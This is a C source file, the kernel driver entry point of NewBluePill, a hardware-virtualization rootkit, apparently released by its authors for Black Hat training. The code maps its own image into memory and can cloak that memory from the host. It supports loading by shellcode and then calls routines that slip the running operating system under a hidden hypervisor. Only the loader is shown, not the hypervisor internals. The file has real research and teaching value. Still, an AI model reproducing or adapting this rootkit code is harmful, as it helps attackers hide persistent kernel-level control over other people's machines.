/* 
 * Copyright holder: Invisible Things Lab
 * 
 * This software is protected by domestic and International
 * copyright laws. Any use (including publishing and
 * distribution) of this software requires a valid license
 * from the copyright holder.
 *
 * This software is provided for the educational use only
 * during the Black Hat training. This software should not
 * be used on production systems.
 *
 */

#include "newbp.h"

// com1	0x3f8
// com2	0x2f8
// com3	0x3e8
// com4	0x2e8

#define	COM_PORT_ADDRESS	0x3f8

extern PHYSICAL_ADDRESS	g_PageMapBasePhysicalAddress;


NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject)
{
	NTSTATUS	Status;

	_KdPrint(("\r\n"));
	_KdPrint(("NEWBLUEPILL: Unloading started\n"));

	if (!NT_SUCCESS(Status=HvmSpitOutBluepill())) {
		_KdPrint(("NEWBLUEPILL: HvmSpitOutBluepill() failed with status 0x%08hX\n",Status));
	}

	_KdPrint(("NEWBLUEPILL: Unloading finished\n"));

	MmShutdownManager();

	return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath) 
{
	NTSTATUS	Status;



#ifdef USE_2MB_PAGES
	PHYSICAL_ADDRESS	CodePA;
	PVOID	CodeVA,AlignedCodeVA;
	ULONG64	VaDelta;
#endif


	PioInit((PUCHAR)COM_PORT_ADDRESS);

	_KdPrint(("\r\n"));
	_KdPrint(("NEWBLUEPILL v%d.%d.%d.%d. Instance Id: 0x%02X\n",
		(NBP_VERSION>>48) & 0xff,
		(NBP_VERSION>>32) & 0xff,
		(NBP_VERSION>>16) & 0xff,
		NBP_VERSION & 0xff,
		g_BpId));

	Status=MmInitManager();
	if (!NT_SUCCESS(Status)) {
		_KdPrint(("NEWBLUEPILL: MmInitManager() failed with status 0x%08hX\n",Status));
		return Status;
	}
/*
	Status=MmMapGuestKernelPages();
	if (!NT_SUCCESS(Status)) {
		_KdPrint(("BEWBLUEPILL: MmMapGuestKernelPages() failed with status 0x%08hX\n",Status));
		return Status;
	}
*/

#ifdef USE_2MB_PAGES

	// this is so until we implement relocation fixing code for DIR64 fixup type
	CodeVA=MmAllocateContiguousPages(512,&CodePA);


#ifdef RUN_BY_SHELLCODE
	AlignedCodeVA=(PVOID)((ULONG64)DriverObject & ~0x1fffff);
	VaDelta=((ULONG64)DriverObject & 0x1fffff);
	memcpy((PUCHAR)CodeVA+VaDelta,DriverObject,(ULONG64)RegistryPath);
#else
	AlignedCodeVA=(PVOID)((ULONG64)DriverObject->DriverStart & ~0x1fffff);
	VaDelta=((ULONG64)DriverObject->DriverStart & 0x1fffff);
	memcpy((PUCHAR)CodeVA+VaDelta,DriverObject->DriverStart,DriverObject->DriverSize);
#endif

	_KdPrint(("NEWBLUEPILL: CodePA: 0x%p, CodeVA: 0x%p, VaDelta: 0x%p\n",
		CodePA.QuadPart,
		CodeVA,
		VaDelta));

	MmCreateMapping(CodePA,AlignedCodeVA,TRUE);

#else

#ifdef RUN_BY_SHELLCODE
	_KdPrint(("NEWBLUEPILL: Image base: 0x%p, image size: 0x%x\n",DriverObject,(ULONG64)RegistryPath));

	Status=MmMapGuestPages(DriverObject,(ULONG)BYTES_TO_PAGES((ULONG64)RegistryPath));
#else
	Status=MmMapGuestPages(DriverObject->DriverStart,BYTES_TO_PAGES(DriverObject->DriverSize));
#endif
	if (!NT_SUCCESS(Status)) {
		_KdPrint(("NEWBLUEPILL: MmMapGuestPages() failed to map guest NewBluePill image with status 0x%08hX\n",Status));
		return Status;
	}


#ifdef ENABLE_MEMCLOAK

#ifdef RUN_BY_SHELLCODE
	Status=McInitCloak(DriverObject,(ULONG64)RegistryPath);
#else
	Status=McInitCloak(DriverObject->DriverStart,DriverObject->DriverSize);
#endif
	if (!NT_SUCCESS(Status)) {
		_KdPrint(("NEWBLUEPILL: McCloak() failed with status 0x%08hX\n",Status));
		return Status;
	}
#endif


#endif

	_KdPrint(("NEWBLUEPILL: g_PageMapBasePhysicalAddress: 0x%p\n",g_PageMapBasePhysicalAddress));

	if (!NT_SUCCESS(Status=HvmInit())) {
		_KdPrint(("NEWBLUEPILL: HvmInit() failed with status 0x%08hX\n",Status));
		MmShutdownManager();
		return Status;
	}

	if (!NT_SUCCESS(Status=HvmSwallowBluepill())) {
		_KdPrint(("NEWBLUEPILL: HvmSwallowBluepill() failed with status 0x%08hX\n",Status));
		MmShutdownManager();
		return Status;
	}

#ifndef RUN_BY_SHELLCODE
	DriverObject->DriverUnload=DriverUnload;
#endif


	_KdPrint(("NEWBLUEPILL: Initialization finished\n"));

	return STATUS_SUCCESS;
}
